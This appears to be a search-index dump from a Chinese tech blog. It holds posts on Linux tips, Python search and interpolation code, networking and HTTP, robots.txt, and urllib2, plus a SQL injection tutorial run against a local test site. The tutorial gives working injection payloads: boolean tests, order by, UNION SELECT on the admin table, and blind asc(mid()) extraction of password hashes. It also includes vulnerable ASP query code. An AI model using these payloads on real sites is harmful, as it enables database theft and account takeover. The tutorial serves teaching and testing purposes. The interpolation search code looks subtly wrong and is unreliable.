ps开头的都查找出来 之后以.bak格式拷贝到tmp目录下whereis + 文件名 查看功能, 在使用whereis 之前先使用updatadb更新一下搜索的数据库，这样的话查找得更多的内容whereis + 文件名 -b 查看文件的二进制文件存放文件","categories":[{"name":"KaliLinux","slug":"KaliLinux","permalink":"https://xiaowuyoucy.github.io/categories/KaliLinux/"}],"tags":[{"name":"Kalinux","slug":"Kalinux","permalink":"https://xiaowuyoucy.github.io/tags/Kalinux/"}]},{"title":"拉格狼日查找算法","slug":"20190410250","date":"2019-03-30T21:08:18.000Z","updated":"2019-04-09T19:17:31.567Z","comments":true,"path":"2019/03/31/20190410250/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/03/31/20190410250/","excerpt":"","text":"拉格狼日查找算法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding=utf-8'''Created on 2019-03-31@author: Administrator'''import timedef costTime(func): def _costTime(finddata,findlist): starttime=time.time() func(finddata,findlist) endtime=time.time() print(endtime-starttime) return _costTime@costTimedef search(finddata,findlist): for data in findlist: if data==finddata: print(\"find\",data) return print(\"not find\")@costTimedef search2(finddata,findlist): low=0 #第一个 high=len(findlist)-1 #代表最后一个 times=0 while low&lt;=high: #不能重叠 times+=1 print(\"times\",times) mid=(low+high)//2 #取出中间索引 middata=findlist[mid] #取出中间数据 if finddata &lt;middata: #小于 淘汰1半 high =mid-1 elif finddata &gt;middata: #小于 淘汰1半 low =mid+1 else: print(\"find\",finddata,mid) return mid print(\"not find\") return -1@costTimedef search2lr(finddata,findlist): low=0 #第一个 high=len(findlist)-1 #代表最后一个 times=0 while low&lt;=high: #不能重叠 times+=1 print(\"times\",times) #mid=(low+high)//2 #取出中间索引 #mid= int( low +(high-low)* 0.5) datamid=((finddata-low)/(high-low)) #datamid=0.5 mid = int(low + (high - low) * datamid) middata=findlist[mid] #取出中间数据 if finddata &lt;middata: #小于 淘汰1半 high =mid-1 elif finddata &gt;middata: #小于 淘汰1半 low =mid+1 else: print(\"find\",finddata,mid) return mid print(\"not find\") return -1findlist=[x+0.1 for x in range(100000000)]finddata=98009999while True: finddata=eval(input(\"data\")) search2lr(finddata,findlist) #2.5050623416900635 拉格狼日插值算法 逐步插值，整体来说还是挺简单的，关键在于算法的部分，这里我运用了二维数组的数据结构来存储每次迭代后的新值。角标的循环初看可能有些复杂，自己动手走一遍就会很清楚啦 ，拉格狼日算法效率是二分查找的几十倍。 12345678910111213141516171819202122232425262728#coding=utf-8'''Created on 2019-03-31@author: Administrator'''def Neville(xt,m,n,x): for i in range(1,n): for j in range(1,n): w[i-j][i]=(x-xt[i-j])/(xt[i]-xt[i-j]) m[i][j]=m[i-1][j-1]+w[i-j][i]*(m[i][j-1]-m[i-1][j-1]) for i in range(n): for j in range(0,i+1): if j%n==0: print(\"\\n\") print(' %f' %m[i][j])n = int(input('插入节点个数:'))x = float(input('输入x的值:'))m = [[0 for i in range(n)] for j in range(n)] #创建n*n矩阵w = [[0 for i in range(n)] for j in range(n)]xt = [0]*nfor i in range(n): m[i][0] = float(input('插入第%d个y值：' %(i+1)))for i in range(n): xt[i] = float(input('插入第%d个x值：' %(i+1)))Neville(xt,m,n,x) 下面的是拉格朗日插值算法，十分简单，分享借鉴。 1234567891011121314151617181920212223242526#coding=utf-8'''Created on 2019-09-31@author: Administrator'''def lagrange(x,xt,yt,n): y = 0 for i in range(n): t = 1 for j in range(n): if i!=j: t = t*(x-xt[j])/(xt[i]-xt[j]) y = y+t*yt[i] print(\"结果为：%f\" %y)xt = []yt = []x = float(input(\"插值x；\"))n = int(input(\"节点数目；\"))for i in range(n): xt.append(float(input(\"第%d个x的值\" %(i+1))))for i in range(n): yt.append(float(input(\"第%d个x的值\" %(i+1)))) lagrange(x,xt,yt,n)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"拉格狼日","slug":"拉格狼日","permalink":"https://xiaowuyoucy.github.io/tags/拉格狼日/"}]},{"title":"网络协议","slug":"201503152349","date":"2019-03-15T15:49:08.000Z","updated":"2019-04-14T16:27:14.631Z","comments":true,"path":"2019/03/15/201503152349/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/03/15/201503152349/","excerpt":"","text":"应用层(Applicatio n Layer) 应用层是为操作系统或网络应用程序提供访问网络服务接口，应用层的协议包括：Telnet、FTP、HTTP、SNMP等等…应用层最终的目的不是解决用户各种具体的应用协议，应用层最终的任务是为用户提供服务。 这里说一下应用层的应用进程，应用进程是指正在运行的应用“程序” 而正在运行的程序都会有通讯的进程方式，这里面先涉及到应用程序的端口，应用程序的协议等，一个联网的应用程序，向外 部 通信时会在 自己的数据包的报头添加上端口号，然后在网络层和数据链路层分别添加上IP地址和MAC地址，将整个数据包发送到外网的主机，外网主机发送过来的数据，操作系统根据 端口号，把 相应的数据包发给 对应的 应用程序（通信软件)。而应用进程最终的目的是为了解决具体的应用问题而彼此通信的进程。 互联网应用层应用分布图： 我们来看看，因特网（(Internet ）最基本的三个应用 1.Email ​ 电子邮件客户程序：Outlook Express、foxmail等，这些 ​ 邮件客户程序→邮件服务器1 →邮件服务器2 →…… →目的邮件服务器→目的邮件客户程序 ​ 电子邮件采用的主要协议是POP3和SMTP SMTP:简单邮箱传输协议，用于电子邮件的传递，建立在UDP（也用TCP） 基础上，端口号25。 POP3：邮局协议（第三版），用于邮件管理和用户邮件的存取。建立在TCP基础上，端口号 110。 2.FTP ​ 允许不同的主机间传送文件，面向连接，基于TCP协议的传输程序， 协议拥有该主机的IP地址（主机域名）、账号、密码。 3.万维网（www） ​ 实际上是一个由千千万万个页面组成的信息网索取页面、浏览信息的程序称为浏览器（Browser，如Netscape、Internet Explorer等），浏览器与Web站点之间通过HTTP协议进行通信 HTTP：超文本传输协议用于传输超文本页面到客户机上，建立在TCP基础上，端口号=80。 应用层的通讯 下图是应用层的通讯过程 建立链接的前提是基于物理层开始的，通讯之间通过一列的物理链接设备（无线电波，光纤，双绞线），物理层通过高低电平工作，传输数据时会将高低电平转化成电信号，发送给被接收者，这些高低电平也就是0和1，通过数据链路层(ethenet)将电信号分组,这些0和1组成一串电信号(10101111) 而每一组的电信号都有特定对应的意义，我们都知道计算机最底层运算是二进制0和1， 就好比数据是字母“A” 要发送和接受两个过程之前都必须转化成电信号，计算机会通过某种机制将你要发送的数据“A”打散成电信号传输到接收方，接受方接受到之后会重新把这些电信号重组通过一层一层的的协议解析出数据这组0和1组成的电信号的意思“A” 这是大概的传输原理。 传输数据是必须遵循以太网（ethernet） 规定的 数据传输必须包含以下部分： 一组电信号的构成一个数据包，也叫做“针” 每一数据帧分成：报头head和数据data两部分 head data 头部(head) 是用来描述数据(data)代表的意义 ，头部包含三种信息 发送者/源地址，6个字节 接收者/目标地址，6个字节 数据类型，6个字节 为什么要有头部（head）信息呢？ 很简单是因为发送数据之前是需要明确，发送者，和接收着的，如果没有这些信息又怎么知道发送者是谁，接收者是谁呢？ 这些信息是在以太网报头定义的，以太网规定每一块网卡必须要有一个MAC地址，而这个MAC地址在网卡出厂之前都会被焊上，全世界独一无二的的MAC地址，MAC地址长度为48位二进制数，通常由12位16进制数表示（前六位是厂商编号，后六位是流水线号） 有了MAC地址之后可以满足于局域网内通讯了，局域网通信是基于UDP协议进行的，优点就是无需建立链接，具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。 但缺点就是，无法避免攻击的，比如：UDP Flood攻击…… UDP的缺点： 不可靠，不稳定 因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。 基于上面的优缺点，那么： 什么时候应该使用TCP： 当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。 在日常生活中，常见使用TCP协议的应用如下： 浏览器，用的HTTP FlashFXP，用的FTP Outlook，用的POP、SMTP Putty，用的Telnet、SSH QQ文件传输 ………… 什么时候应该使用UDP： 当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。 比如，日常生活中，常见使用UDP协议的应用如下： QQ语音 QQ视频 TFTP …… 跨局域网通讯 基于MAC地址方式，只是能够实现到我们在一个网段里通讯，一个数据包在发送到目标地址之前会进行子网掩码,算出是否在一个网段里，如果是同一个网段直接广播方式传输数据即可接收到，否则并不能让我们夸局域网通信，这里还需要涉及到网关，要包数据包发送出外网就必须把包交给网关，网关就好比一个代理人，网关接受到我们要发送出去的包之后，会将包发送给对方的网关，对方的网关将包拆开之后发现头部的信息来源以及接受的目标地址是谁，从而发送给接收者。 所以IP地址加MAC地址就是标识你全世界的这台机器在哪儿，有了这些基础之后并不够，这些基础只能让我们找到机器，假如现在要进行通讯服务，是基于一个软件上的互相的通讯，我要给对方发送信息，假如对方的机器上运行着无数的软件，那么这个包是不知道是哪个客户端的软件发来的数据，为了解决这一问题，在传输层里又出现了TCP/UDP 协议，这两者协议都是基于端口工作的，每个应用程序都对应着唯一的端口号，目前最大端口号为65536，超出范围的是无效端口，1024之前的端口号都是操作系统所用，超过1024之后的都是应用程序在用， 应用层协议开发者可以自己定义，也可以遵循通用的标准，我们的软件应用程序，都运行在应用层，归根结底应用层是产生数据的，产生数据之后会经过这五层协议，发送给接收者， 在应用层会封装头部信息，原MAC地址/目标MAC地址 ,到了传输层封装原端口/目标端口,到了网络层封原IP/目标IP，最后到了数据链路层封了原MAC/目标MAC，最后到了物理层将这些数据包打包成了电信号转换成二进制高低电平，发送给接收方，对方物理层接受到，到了数据链路层之后这些电信号进行成组，解包得到MAC地址，找到MAC地址之后，再往上一层网络层找，找到IP地址，之后到传输层找到端口对应产生数据的应用程序，最后到了对方的应用层，对方得到传输过去的数据。 主机上网过程 域名 Internet采用层次树状结构的命名方法，它使得任何一个连接在Internet上的主机或路由器都有一个唯一的层次结构的名字，即域名（Domain name）。所谓域(Domain)是域名空间中的一个子树。这个域的名字就是这个子树顶部结点的域名，一个域本身又可划分为若干个域(有时也称它们为子域)。例如：edu是标识教育系统的一个大的域，而tsinghua.edu和besti.edu则是edu域中的两个子域。 目前Internet顶级域名分为三大类： 国家顶级域名：采用ISO 3166规定。如cn表示中国，us表示美国等 国际顶级域名：采用int。国际性的组织可在int下注册。 通用顶级域名：如下表所列。 域名 组织类型 域名 组织类型 com 商业机构 firm 公司企业 edu 教育部门 shop 销售公司与企业 gov 政府部门 web 突出万维网服务单位 org 非商业组织 arts 突出文化艺术活动单位 net 网络服务机构 rec 突出逍遥娱乐活动单位 mil 美国军队组织 info 提供信息服务 nom 个人 域名DNS服务系统 在DNS中由域名服务器（DNS Server）完成域名与IP地址的转换过程，这个过程称为域名解析 域名服务器主要分为以下几个： 1．本地域名服务器 2．根域名服务器 3．授权域名服务器 认识URL url的组成部分（unifrom resource locator） 例如：https://www.microsoft.com/china/index.html https:// 这里是代表超文本传输协议，通知microsoft.com服务器显示Web页面 www 代表一个web(万维网) 服务器; Microsoft.com/ 这是装有页面的服务器的域名，或站点服务器名称; China/ 为该服务器上的子目录，就好像我们的文件夹; index.html 是文件夹中的html文件（网页）。 HTTP是如何工作的？ HTTP客户端启动TCP连接(创建套接字) 到服务器, 端口 80。一旦建立连接，浏览器进程和服务器进程就可以通过各自的套接字来访问，http 报文(应用层协议报文) 在浏览器 (http client) 和Web服务器(http server)之间进行交换。 客户端套接字。客户往自己的套接字发送HTTP请求消息，也从自己的套接字接收HTTP响应消息，服务器从自己的套接字接收HTTP请求消息，也往自己的套接字发送HTTP响应消息。 持久性与非持久性 非持久连接和持久连接 HTTP既可以使用非持久连接(non-persistent connection)，也可以使用持久连接(persistent connection)。HTTP/1.0使用非持久连接，HTTP/1.1默认使用持久连接。 非持久性链接： ​ 非持久连接情况下从服务器到客户传送一个Web页面的步骤。假设该页面由1个基本HTML文件和10个JPEG图像构成，而且所有这些对象都存放在同一台服务器主机中。 再假设该基本HTML文件的URL为： http://www.besti.edu.cn/somepath/index.html 下面是具体步骤: 1.HTTP客户初始化一个与服务器主机www.besti.edu.cn中的HTTP服务器的TCP连接。HTTP服务器使用默认端口号80监听来自HTTP客户的连接建立请求。 2.HTTP客户经由与TCP连接相关联的本地套接字发出一个HTTP请求消息。这个消息中包含路径名/somepath/index.html。 2.HTTP服务器经由与TCP连接相关联的本地套接字接收这个请求消息，再从服务器主机的内存或硬盘中取出对象/somepath/index.html，经由同一个套接字发出包含该对象的响应消息。 3.HTTP服务器告知TCP关闭这个TCP连接(不过TCP要到客户收到刚才这个响应消息之后才会真正终止这个连接)。 4.HTTP客户经由同一个套接字接收这个响应消息。TCP连接随后终止。该消息标明所封装的对象是一个HTML文件。客户从中取出这个文件，加以分析后发现其中有10个JPEG对象的引用。 6.给每一个引用到的JPEG对象重复步骤1-4。 持久性链接 持久连接情况下，服务器在发出响应后让TCP连接继续打开着。同一对客户/服务器之间的后续请求和响应可以通过这个连接发送，通常，HTTP服务器在某个连接闲置一段特定时间后关闭它，而这段时间通常是可以配置的。 持久连接分为不带流水线(without pipelining)和带流水线(with pipelining)两个版本。如果是不带流水线的版本，那么客户只在收到前一个请求的响应后才发出新的请求。 HTTP/1.1的默认模式使用带流水线的持久连接。这种情况下，HTTP客户每碰到一个引用就立即发出一个请求，因而HTTP客户可以一个接一个紧挨着发出各个引用对象的请求。服务器收到这些请求后，也可以一个接一个紧挨着发出各个对象。 HTTP规范1.0[RPcl945]和HTTP1.1 [RFC 2616]定义了HTTP消息的格式。HTTP消息分为请求消息和响应消息两类。 68} HTTP请求消息: 12345GET /somedir/page.html HTTP/1.1 Host:www.besti.edu.cn Connection:closeUser-agent:Mozilla/4.0 Accept-language:zh-cn HTTP请求标准格式 Request 附属体不在GET方法中使用，而是在POST方法中使用。 POST方法适用于需由用户填写表单的场合，如往google搜索引擎中填入待搜索的词。用户提交表单后， HEAD方法与GET方法类似，两者的差别只是服务器在对HEAD方法的响应消息中去掉了所请求的对象，其他内容则与对GET方法的响应消息一样。HEAD方法通常用于HTTP服务器软件开发人员进行调试。 POST方法示例 12345678POST /HTTP/1.1Host: www.wrox.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)Gecko/20050225 Firefox/1.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 40Connection: Keep-Alivename=Professional%20Ajax&amp;publisher=Wiley HTTP响应消息 12345678HTTP/1.1 200 OKConnection:closeDate: Thu, 13 Oct 2005 03:17:33 GMTServer: Apache/2.0.54 (Unix)Last—Modified:Mon,22 Jun 1998 09;23;24 GMTContent—Length:682lContent—Type:text/html(数据 数据 数据 数据 数据…………) HTTP响应标准格式 Response 响应报文的开始行是状态行,状态行包括三项内容，即 HTTP 的版本，状态码，以及解释状态码的简单短语。 HTTP常用状态码 1xx 表示通知信息的，如请求收到了或正在进行处理。 2xx 表示成功，如接受或知道了。 3xx 表示重定向，表示要完成请求还必须采取进一步的行动。 4xx 表示客户的差错，如请求中有错误的语法或不能完成。 5xx 表示服务器的差错，如服务器失效无法完成请求。 ●200 OK;请求成功，所请求信息在响应消息中返回。 ●301 Moved Permanently:所请求的对象己永久性迁移; ​ 新的URL在本响应消息的Location:头部指出。客户软件会自动请求这个新的URL。 ●400 Bad Request;表示服务器无法理解相应请求的普通错误的状态码 ●404 Not Found:服务器上不存在所请求的文档。 ●HTTP Version Not Support:服务器不支持所请求的HTTP协议版本。 三次握手","categories":[{"name":"网络协议","slug":"网络协议","permalink":"https://xiaowuyoucy.github.io/categories/网络协议/"}],"tags":[{"name":"网络模型","slug":"网络模型","permalink":"https://xiaowuyoucy.github.io/tags/网络模型/"},{"name":"ISO七层模型","slug":"ISO七层模型","permalink":"https://xiaowuyoucy.github.io/tags/ISO七层模型/"}]},{"title":"Robots文件中的配置说明","slug":"201812282242","date":"2018-12-28T14:43:02.000Z","updated":"2019-04-07T14:04:18.077Z","comments":true,"path":"2018/12/28/201812282242/","link":"","permalink":"https://xiaowuyoucy.github.io/2018/12/28/201812282242/","excerpt":"","text":"*表示所有搜索引擎，用于指定蜘蛛使用； ~表示以某字符串开头； $表示以某字符串结尾； /表示当前目录下的所有内容。 格式 User-agent: 蜘蛛名称； Disallow: 内容名称； Allow:内容名称； 参数说明 User-agent 指定搜索引擎蜘蛛名称； Disallow要禁止抓取的内容； Allow允许抓取的内容。 Robots文件写法参考 指定蜘蛛：User-agent:* 。这里的*代表的所有的搜索引擎种类，*是一个通配符。 禁止写法 Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录； Disallow: /admin 这里定义是禁止爬寻admin目录； Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下所有以“.htm”为后缀URL（包含子目录）； Disallow: /？ 禁止访问网站中所有包含问号（？）的网址； Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片； Disallow:/ab/adc.html 禁止爬取ab文件夹下面的adc.html文件。 允许写法 Allow: /cgi-bin/ 这里定义是允许爬寻cgi-bin目录下面的目录； Allow: /tmp 这里定义是允许爬寻tmp的整个目录； Allow: .htm$ 仅允许访问以&quot;.htm&quot;为后缀的URL； Allow: .gif$ 允许抓取网页和gif格式图片。 各大搜索引擎蜘蛛的名称写法 1、百度蜘蛛：Baiduspider 百度蜘蛛名称为Baiduspider日志中还发现了Baiduspider-mobile（抓取wap）、Baiduspider-image（抓取图片）、Baiduspider-video（抓取视频）、Baiduspider-news（抓取新闻）。以上百度蜘蛛目前常见的是Baiduspider和Baiduspider-image两种。 2、谷歌蜘蛛：Googlebot ，Googlebot-Mobile，看名字是抓取wap内容的 3、360蜘蛛：360Spider，这个家伙比较勤劳 4、SOSO蜘蛛：Sosospider，比360更加勤劳 5、雅虎蜘蛛：Yahoo! Slurp China 6、有道蜘蛛：YoudaoBot 7、搜狗蜘蛛：Sogou News Spider 搜狗蜘蛛还包括如下这些：Sogou web spider、Sogou inst spider、Sogou spider2、Sogou blog、Sogou News Spider、Sogou Orion spider，等等、、、、、、 8、MSN蜘蛛：msnbot，msnbot-media 9、必应蜘蛛：bingbot 10、一搜蜘蛛：YisouSpider 11、Alexa蜘蛛：ia_archiver 12、宜搜蜘蛛：EasouSpider 13、即刻蜘蛛：JikeSpider 14、一淘网蜘蛛：EtaoSpider","categories":[{"name":"技术资讯","slug":"技术资讯","permalink":"https://xiaowuyoucy.github.io/categories/技术资讯/"}],"tags":[{"name":"SEO网站优化","slug":"SEO网站优化","permalink":"https://xiaowuyoucy.github.io/tags/SEO网站优化/"}]},{"title":"WEB渗透偏之SQL注入","slug":"201812282306","date":"2018-12-28T14:43:02.000Z","updated":"2019-04-23T14:45:42.377Z","comments":true,"path":"2018/12/28/201812282306/","link":"","permalink":"https://xiaowuyoucy.github.io/2018/12/28/201812282306/","excerpt":"","text":"不管用什么语言编写的web应用，它们都有一个共同点，就是具有交互性并且大多数是数据库驱动的，WEB应用随处可见，因此存在的SQL注入是影响企业运营最具破坏性的漏洞，SQL注入就是通过操作SQL语句进行攻击的从而达到攻击的目的，我们通常在网上能够看到的，某某网站被脱，某某网站被脱裤，那么这些很大可能就是通过SQL注入来实现的，通常渗透者攻击的目的是得到数据库相关的信息，例如账号密码，用户信息等等。 二. SQL注入是如何产生的呢？ 简单的来说，网站新闻内容，会员中心，查询等都会和数据库进行关联，其中在数据之间交互中，传输的就是SQL语句，攻击者通过操作SQL语句来达到SQL注入攻击。 三. SQL注入漏洞能造成哪些危害呢？ 常见的操作： 网站数据库信息泄露 网站数据被修改 网站整站程序源码被Download 架设网站的服务器被入侵挂木马等等… 四. SQL注入原理分析 可注入是因为网站程序存在可控传递参数，参数未进行过滤直接带入数据库查询，导致攻击者可通过传递恶意sql语句代码进行执行攻击。 SQL注入的产生条件 必须有传输传递 传输值带入数据库查询并执行 我们来看一个基本网站组成的url链接： 网站地址： http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 网站地址：http://127.0.0.1/0/ 文件目录：Production 文件名：PRODUCT_DETAIL.asp 参数名：id 参数值：1513 首先是有网站地址—&gt;文件目录—&gt;文件名—&gt;参数名—&gt;参数值 基于这种链接我们可以尝试在参数1513后面再随便传递一些参数比如dddd，如果报错，是因为在接受1513这个ID值的时候后把dddd也传递过去了，这个情况我们称之为SQL带入查询。 显然刚才不是SQL语句，所以报错了，一般情况下如果参数只接收不带入查询的话我们无论输入什么都不会有任何报错的迹象，证明是不存在SQL注入点的，能够带入查询是因为网站没有对参数进行过滤，所以导致带入查询，那么试想一下假设我带入查询是SQL语句，这语句的操作是查看网站用户信息或者密码的这时候是不是很危险呢？ 测试题 1.下面那些地址可能存在sql注入？ A.www.cnblog.io/news.asp B.www.cnblog.io/index.asp?page=11 C.www.cnblog.io/news.asp?id=1&amp;page=2 D.www.cnblog.io/?id=11 2.已知cnblog.io/news.asp?id=1&amp;page=1 中参数id存在注入，下面那个注入测试正确？ A.cnblog.io/news.asp?id=1 and 1=1&amp;page=1 B.cnblog.io/news.asp?id=1&amp;page=1 and 1=1 C.cnblog.io/news.asp?id=1 and 1=1&amp;page=1 and 1=1 cnblog.io/news.asp?id=1&amp;page=1 and 1=1 将注入参数设为page（工具检测不出） cnblog.io/news.asp?page=1&amp;id=1 将注入参数设为id 前面我们说到，只所以能够带入数据库查询是因为网站没有对参数进行过滤，也就是说编写网站的人在写这个业务逻辑代码有BUG， 我们来看看如下的一串代码案例，这次代码是没有对参数进行过滤的，存在带入数据库查询的操作。 1234567PRODUCT_DETAIL.asp代码：&lt;%id=request(&quot;id&quot;) 接受参数名id的值并赋值给变量id （前面id=变量，后面id=参数名）sql=&quot;select * from product where id=&quot;&amp;id 组合变量id的sql语句set rs=conn.execute(sql) 执行sql语句%&gt; http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 select * from product where id=1513 我们来看一下PRODUCT_DETAIL.asp里面的id=request(“id”)其中id是等于变量 request(‘id’)接受参数的值并且赋值给了变量ID， 这时sql语句组合select * from product where id=1513， 1513是接收到的网站参数，那么这个页面存在肯定是返回正常的。 http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513’ select * from product where id=1513’ 页面报错，无此id 看上行的链接和SQL语句组合，当在网站链接的id参数后面多家了一个’ 这时SQL语句执行错误报错返回错误页面，证明我们可以任意带入参数查询的，那么大家想假设我在参数后面带入的是sql查询语句是不是能够查到数据库的信息呢，这就是SQL注入对网站危害之处。 判断注入点常用的逻辑语 数学逻辑运算符： 或 且 非(or and xor) 真且真=真 假且真=假 真或真=真 真或假=真 用法是在网站链接参数后面加上逻辑判断法 id=1513 and 1=1 那么加上之后，这是SQL语句是这样组合的 select * from product where id=1513 and 1=1 真且真=真 返回正常 因为这是真逻辑所以返回真，我们 加上and 1 = 11 , 这是SQL语句是这样组合的 select * from product where id=1513 and 1=11 真且假=假 返回错误，这时我们可以确定注入点的存在，我们重新组SQL语句可以在参数后面进行传达相关的恶意sql语句来达到带入数据库查询的目的 那么判断到有注入点之后，我们怎么猜数据库里面的信息呢？ 这里需要了解一个分层结构。 ACCESS数据库 表名 列名 数据 通过以上四部我们可以得到数据，首先是过表名来得到列名，再通过列名最后得到数据的。 总结分为4步 判断注入 猜解表名 猜解列名 猜解数据 接下来我们搭建个测试环境来进行实战一下注入的操作， 以access数据库为例，首先猜表明，在参数id=1513 后面传入， 猜表明的语句首先是判断有多少个字段，语句是order by 22，如下图 当回车的时候页面返回是正常的，那么我们继续判断order by 23 这次我填的字段是23 返回了错误页面因此可见表名的字段不等于23，那么可以确定表名的字段是&lt;=22的。 找到表名的字段长度之后我们继续进行猜列名的操作语句如下 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin 这段SQL语句的意思是 查询有没有admin这个表，我们一般做渗透猜解的大部分是admin表，因为这通常是一些管理员信息，如账号密码等，我们把上面语句带入查询一下，一般情况下如果存在admin这个表名的话， 网页会随机爆出一些数字，我们得到这些具体数字之后，可以对应着字段去查列名相关信息了，之后能得到数据。 得到的数字是3和15，那么我们可以在3和15字段利填写相关列名的信息，如果存在这个列名，那么就会爆出相关的数据，一般列名常见要爆的都是一些密码和账号信息列名如果存在的话就会爆出相关的数据信息，如下图 字段15填的是admin爆出了管理员账号，字段3填的是password爆出的是一个md5值，md5值我们可以进行md5解密得到真正的密码如下图所示 得到明文“bendss” 我们可以尝试用管理员的账号密码登录一下网站后台。 OK 能够成功登录，证明我们猜解出来的账号密码是正确的。 换第二种猜解方式，来尝试一下猜解，刚才的猜解方式叫联合查询法，联合查询法和逐字才猜解法是有一定区别的， 逐字才猜解法，兼容性强，一般的注入工具猜解的都是采用:逐字猜解法如明小子，阿迪，萝卜头，穿山甲等注入工具，因为联合查询法有时候猜解不出来，明明存在注入点都猜解不出来来，兼容性不强。 猜解语法： 查表：and exists (select * from 表名) 查列：and exists (select 列名 from 表名) 查数据：1.确定长度 2.确定asc数据(asc编码) and (select top 1 len(列名) from admin)=5 and (select top 1 asc(mid(列名,位数,1)) from admin)=97 and (select top 1 asc(mid(列名,位数,1)) from admin)=97 依然是先猜表名，我们使用 and exists (select * from admin) 语句来猜解一下 admin表是否存在，如果存在就返回正常，返回错误就代表不存在早 确定admin表存在之后，我们来猜一下列名，使用1. 查列：and exists (select username from admin) 来猜解， 如果返回错误则是代表这个列名不存在。 然而这个列名是不存在的，我们换一个试试,换成密码列名 exists (select password from admin) 看结果是返回正常页面的，证明有password这个表，接下来我们确定一下这个表的长度，使用 and (select top 1 len(password) from admin)=5 第一次我猜解的长度设置为5，返回的结果是错误页面，证明长度并不是等于5， 我们再把长度设置为&gt;=5如果返回正常页面说明，这个列名长度肯定是大于5或者等于5的 看上图返回正确页面了，我们都知道一般像这些网站管理员密码通常都采用md5加密，所以一般的md5加密长度为16的，我们再把长度的值选择17位试试，如果返回错误，我们再设置回16，如果返回正确那么证明，这个列名的长度等于16位的md5加密长度。 事实证明，长度不也不等于17位，那么再把长度设置为16位看看，如果返回正确页面基本上，可以断定是16位的md5加密值了 事实证明，这个密码列名的长度为16位的md5加密值， 好以上的基本猜解步骤已经完成，我们可以着手猜列名的内容， 使用语法 and (select top 1 asc(mid(password,1,1)) from admin)=97 mid()里面的password代表是列名,1是代表猜16位长度的第一位的值内容，后面=97是ascii编码97对应的是a,如下是ascii码的对应表。 我们明白了怎么回事之后就开始猜解吧 回车： 好，回车之后发现返回页面的结果是正确的，证明16位的md5值第一位是97ascii码表的对应值，也就是“a” 接下来我们猜第二位， 这次我把值设置为&lt;=52 发现是正确的，那么说明这个结果可能少于52又或者等于52，所以继续猜，最后我发现这个结果是等于52。 所以是ascii码对应的值“4”，以此类推，值到把16位md5值猜解完毕，猜解得到的md5值，就可以进行md5解密了。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://xiaowuyoucy.github.io/tags/sql注入/"},{"name":"web渗透","slug":"web渗透","permalink":"https://xiaowuyoucy.github.io/tags/web渗透/"}]},{"title":"urlib2库的基本使用","slug":"201902262135","date":"2017-07-23T09:20:34.000Z","updated":"2019-04-14T18:24:45.251Z","comments":true,"path":"2017/07/23/201902262135/","link":"","permalink":"https://xiaowuyoucy.github.io/2017/07/23/201902262135/","excerpt":"","text":"所谓⽹⻚抓取，就是把 URL 地址中指定的⽹络资源从⽹络流中读取出来，保存到本地。 在 Python 中，我们使⽤ urllib2 这个组件来抓取⽹⻚。 urllib2 是 Python2.7 ⾃带的模块(不需要下载)， 是 Python 的⼀个获取URLs(Uniform Resource Locators)的重要组件。 urllib2 官⽅⽂档：https://docs.python.org/2/library/urllib2.html urllib2 源码：https://hg.python.org/cpython/file/2.7/Lib/urllib2.py urllib2 在 python3.x 中被改为 urllib.request 1.urlopen 我们先来段代码： 12345# urllib2_baidu.pyimport urllib2response = urllib2.urlopen(\"http://www.baidu.com\")html = response.read()print html So Easy! 最简单的获取⼀个 url 的⻚⾯代码居然只需要 4⾏！ 执⾏写的 python 代码: 1Power@PowerMac ~$: python urllib2_baidu.py 会看到以下结果： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"&gt;&lt;meta content=\"always\" name=\"referrer\"&gt;&lt;meta name=\"theme-color\" content=\"#2932e1\"&gt;&lt;link rel=\"shortcut icon\" href=\"/favicon.ico\" type=\"image/x-icon\" /&gt;&lt;link rel=\"search\" type=\"application/opensearchdescription+xml\" href=\"/content-search.xml\" title=\"百度搜索\" /&gt;&lt;link rel=\"icon\" sizes=\"any\" mask href=\"//www.baidu.com/img/baidu.svg\"&gt;&lt;link rel=\"dns-prefetch\" href=\"//s1.bdstatic.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t1.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t2.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t3.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t10.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t11.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t12.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//b1.bdstatic.com\"/&gt;&lt;title&gt;百度⼀下，你就知道&lt;/title&gt; ... ​ 实际上，如果我们在浏览器上打开百度主⻚， 